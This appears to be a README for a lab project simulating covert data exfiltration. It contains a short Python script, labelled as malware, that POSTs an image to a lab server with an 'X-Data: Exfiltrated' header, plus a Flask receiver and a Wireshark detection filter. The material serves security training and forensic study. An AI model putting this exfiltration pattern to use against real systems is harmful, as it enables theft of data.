# Forensic Analysis of Data Exfiltration via Covert Channels

## Overview
This project simulates a covert data exfiltration scenario using:
- Python-based ethical malware
- Steganography in `.png` images
- HTTP POST transmissions with custom headers
- A Flask-based rogue server

The goal is to model real-world threat tactics, demonstrate how covert channels evade detection, and walk through the full forensic analysis process.

---

## Technologies Used
- Python 3.12
- Flask (rogue server)
- Wireshark (traffic analysis)
- VirtualBox VMs (Windows attacker, Linux receiver)

---

## Key Components

### Malware Behavior

The simulated malware script transmits an image file with embedded data using a custom HTTP header:

```python
import requests

url = "http://192.168.1.100:5000/upload"  # Replace with your Flask server IP

response = requests.post(
    url,
    files={'file': open('fake_image.png', 'rb')},
    headers={'X-Data': 'Exfiltrated'}
)

print(response.status_code)
```

### Flask Rogue Server

A basic Flask app listens for uploads and saves received images while logging the custom header:

```python
from flask import Flask, request
import os

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    header = request.headers.get('X-Data')
    print(f"Received X-Data: {header}")
    file.save(os.path.join(UPLOAD_FOLDER, file.filename))
    return "OK", 200
```

---

### Network Detection
- Wireshark used to trace POST traffic
- Custom header identified: `X-Data: Exfiltrated`
- Traffic filtered with:
  ```
  http.request.method == "POST"
  ```

---

### Forensic Workflow
- Endpoint log inspection
- Server-side file recovery
- Header analysis and timeline correlation

---

## Ethical Safeguards
- Non-persistent, sandboxed malware
- Synthetic data only
- Isolated virtual lab setup
- All tools used under legal licenses

---

## Learning Outcomes
- Covert channel construction and detection
- Steganography in network forensics
- Log correlation across endpoints and networks
- Real-world SOC and law enforcement parallels

---

## Full Write-up
See the complete analysis and methodology:  
[Forensic_Data_Exfiltration_Covert_Channels_Grant_Pierce.pdf](./Forensic_Data_Exfiltration_Covert_Channels_Grant_Pierce.pdf)

---

## Sample Files
- `malware.py` – Exfiltration script
- `server.py` – Flask receiver
- `fake_image.png` – Sample test file

---

## License
MIT License
